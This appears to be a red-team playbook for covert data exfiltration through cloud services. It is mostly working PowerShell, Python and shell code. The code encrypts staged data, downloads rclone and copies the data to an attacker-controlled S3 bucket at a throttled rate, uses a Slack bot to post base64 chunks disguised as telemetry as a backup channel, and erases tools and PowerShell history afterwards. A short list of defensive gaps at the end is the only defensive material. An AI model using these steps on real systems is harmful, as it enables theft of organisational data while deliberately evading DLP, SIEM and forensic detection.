# Living-off-cloud exfiltration

Moving data through normal business processes using only approved tools
and trusted destinations. Goal: complete the exfiltration phase without
generating any alerts in the target's security tooling.

## Scope and prerequisites

- Target: organisation using Microsoft 365 or Google Workspace with cloud
  storage; corporate firewall permits HTTPS to major cloud providers
- Access: valid identity on target environment (from collection phase)
- Infrastructure: attacker-controlled accounts on at least two cloud providers
- Success criteria: all staged data received on attacker infrastructure;
  no DLP alert or SIEM alert generated

## Phase 1: assess the exfiltration surface

Before selecting a channel, understand what outbound traffic is permitted
and monitored:

```powershell
# what cloud services are accessible from this host?
$services = @(
    'https://graph.microsoft.com',
    'https://storage.googleapis.com',
    'https://s3.amazonaws.com',
    'https://api.dropboxapi.com',
    'https://content.dropboxapi.com',
    'https://slack.com/api',
    'https://downloads.rclone.org'
)
foreach ($url in $services) {
    try {
        $r = Invoke-WebRequest -Uri $url -Method HEAD -TimeoutSec 5 -ErrorAction Stop
        Write-Output "ACCESSIBLE: $url ($($r.StatusCode))"
    } catch {
        Write-Output "BLOCKED: $url"
    }
}
```

## Phase 2: stage the data

Compress and encrypt before any transfer:

```powershell
# compress collected material
Compress-Archive -Path C:\Temp\collected -DestinationPath C:\Temp\staged.zip

# optional: encrypt with a key known to attacker infrastructure
# using 7-Zip if available, or PowerShell AES
$key = [System.Convert]::FromBase64String('ATTACKER_BASE64_KEY_32BYTES')
$iv  = [System.Convert]::FromBase64String('ATTACKER_BASE64_IV_16BYTES')
$aes = [System.Security.Cryptography.Aes]::Create()
$aes.Key = $key; $aes.IV = $iv

$infile  = [System.IO.File]::ReadAllBytes('C:\Temp\staged.zip')
$outfile = [System.IO.File]::OpenWrite('C:\Temp\staged.enc')
$cs = New-Object System.Security.Cryptography.CryptoStream(
    $outfile, $aes.CreateEncryptor(),
    [System.Security.Cryptography.CryptoStreamMode]::Write)
$cs.Write($infile, 0, $infile.Length)
$cs.Close(); $outfile.Close()
```

## Phase 3: primary channel (cloud sync)

Use Rclone to sync to attacker-controlled S3:

```powershell
# deploy rclone without installation
Invoke-WebRequest -Uri 'https://downloads.rclone.org/rclone-current-windows-amd64.zip' `
  -OutFile C:\Temp\rc.zip -UseBasicParsing
Expand-Archive C:\Temp\rc.zip C:\Temp\rctool\
$rclone = (Get-ChildItem C:\Temp\rctool -Recurse -Filter rclone.exe).FullName

# configure via environment variables (no file on disk)
$env:RCLONE_CONFIG_EXFIL_TYPE = 's3'
$env:RCLONE_CONFIG_EXFIL_PROVIDER = 'AWS'
$env:RCLONE_CONFIG_EXFIL_ACCESS_KEY_ID = 'ATTACKER_KEY'
$env:RCLONE_CONFIG_EXFIL_SECRET_ACCESS_KEY = 'ATTACKER_SECRET'
$env:RCLONE_CONFIG_EXFIL_REGION = 'eu-west-1'

# transfer: throttled to 200KB/s to blend with normal sync traffic
& $rclone copyto C:\Temp\staged.enc exfil:attacker-bucket/out.enc `
  --bwlimit 200k --quiet --no-check-dest
```

## Phase 4: backup channel (covert channel via Slack)

If the primary channel is blocked, use a Slack webhook as a secondary:

```python
import requests, base64, os, time

token   = 'xoxb-ATTACKER-BOT-TOKEN'
channel = 'CHANNEL_ID'
chunk_size = 3000

with open(r'C:\Temp\staged.enc', 'rb') as f:
    encoded = base64.b64encode(f.read()).decode()

parts = [encoded[i:i+chunk_size] for i in range(0, len(encoded), chunk_size)]
for i, part in enumerate(parts):
    requests.post('https://slack.com/api/chat.postMessage',
        headers={'Authorization': f'Bearer {token}',
                 'Content-Type': 'application/json'},
        json={'channel': channel,
              'text': f'telemetry_{i:04d}: {part}'})
    time.sleep(10)  # pace: 1 message per 10 seconds
```

## Phase 5: verify receipt

From attacker infrastructure:

```bash
# verify the file arrived intact
aws s3 ls s3://attacker-bucket/ --profile attacker
aws s3 cp s3://attacker-bucket/out.enc /tmp/received.enc --profile attacker

# decrypt and verify
openssl enc -d -aes-256-cbc -in /tmp/received.enc -out /tmp/received.zip -k KEY
md5sum /tmp/staged.zip  # compare with the hash noted before transfer
unzip -t /tmp/received.zip
```

## Phase 6: clean up on target

```powershell
# remove rclone and any config
Remove-Item C:\Temp\rc.zip, C:\Temp\rctool\ -Recurse -Force
Remove-Item C:\Temp\staged.zip, C:\Temp\staged.enc -Force
Remove-Item C:\Temp\collected\ -Recurse -Force

# clear PowerShell history
Remove-Item (Get-PSReadlineOption).HistorySavePath -Force
[System.Environment]::SetEnvironmentVariable('RCLONE_CONFIG_EXFIL_TYPE', $null)
# (environment variables cleared on shell exit)
```

## Defensive gaps this exposes

- Cloud egress monitoring: absence of monitoring for API calls to cloud
  storage providers (vs. just web browsing)
- DLP: no rate-based or volume-based detection for cloud uploads
- Rclone: legitimate tool, often not blocked; its presence on a workstation
  may not trigger EDR
- Encrypted archives: content inspection is ineffective against AES-encrypted
  payloads; detection must be behavioural
- Slack: webhooks and bot API calls are indistinguishable from legitimate
  Slack application traffic
